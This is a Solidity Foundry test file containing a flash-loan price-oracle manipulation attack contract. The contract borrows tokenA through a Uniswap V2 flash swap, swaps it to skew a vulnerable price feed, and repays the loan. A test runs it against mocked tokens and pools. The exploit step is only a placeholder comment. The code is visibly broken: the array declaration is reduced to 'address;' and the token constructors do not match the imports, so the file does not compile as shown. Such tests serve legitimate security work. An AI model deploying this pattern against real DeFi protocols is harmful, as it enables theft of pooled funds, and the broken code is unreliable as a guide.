// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PriceManipulation.sol";

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PriceManipulationAttack {
    IUniswapV2Router02 public uniswapRouter;
    IUniswapV2Pair public uniswapPair;
    VulnerablePriceFeed public targetContract;

    address public tokenA;
    address public tokenB;

    constructor(
        address _router,
        address _pair,
        address _target,
        address _tokenA,
        address _tokenB
    ) {
        uniswapRouter = IUniswapV2Router02(_router);
        uniswapPair = IUniswapV2Pair(_pair);
        targetContract = VulnerablePriceFeed(_target);
        tokenA = _tokenA;
        tokenB = _tokenB;
    }

    function executeAttack(uint256 flashLoanAmount) external {
        // 1. Borrow tokenA using a flash loan
        bytes memory data = abi.encode(flashLoanAmount);
        uniswapPair.swap(flashLoanAmount, 0, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(uniswapPair), "Unauthorized");

        uint256 flashLoanAmount = abi.decode(data, (uint256));

        // 2. Swap tokenA to tokenB to manipulate price
        IERC20(tokenA).approve(address(uniswapRouter), flashLoanAmount);

        address;
        path[0] = tokenA;
        path[1] = tokenB;

        uniswapRouter.swapExactTokensForTokens(
            flashLoanAmount,
            1,
            path,
            address(this),
            block.timestamp
        );

        // 3. Check manipulated price from the target contract
        uint256 manipulatedPrice = targetContract.getPrice();
        require(manipulatedPrice > 0, "Invalid manipulated price");

        // 4. Exploit based on manipulated price (e.g., arbitrage)
        // ... implement exploitation logic here

        // 5. Repay the flash loan
        uint256 repayAmount = flashLoanAmount + ((flashLoanAmount * 3) / 1000); // 0.3% fee
        IERC20(tokenA).transfer(address(uniswapPair), repayAmount);
    }
}

contract PriceManipulationTest is Test {
    VulnerablePriceFeed public priceFeed;
    PriceManipulationAttack public attacker;

    address public tokenA;
    address public tokenB;
    address public uniswapPair;

    function setUp() public {
        // Mock Uniswap Pair and Tokens
        tokenA = address(new ERC20("TokenA", "TKA", 18, 1000000 ether));
        tokenB = address(new ERC20("TokenB", "TKB", 18, 1000000 ether));

        // Mock Uniswap Pool
        uniswapPair = address(new MockUniswapPair(tokenA, tokenB));
        priceFeed = new VulnerablePriceFeed(uniswapPair, tokenA, tokenB);

        // Deploy attacker contract
        attacker = new PriceManipulationAttack(
            address(new MockUniswapRouter(uniswapPair)),
            uniswapPair,
            address(priceFeed),
            tokenA,
            tokenB
        );
    }

    function testPriceManipulation() public {
        console.log("Initial price:", priceFeed.getPrice());

        uint256 flashLoanAmount = 10000 ether;
        attacker.executeAttack(flashLoanAmount);

        console.log("Manipulated price:", priceFeed.getPrice());
    }
}
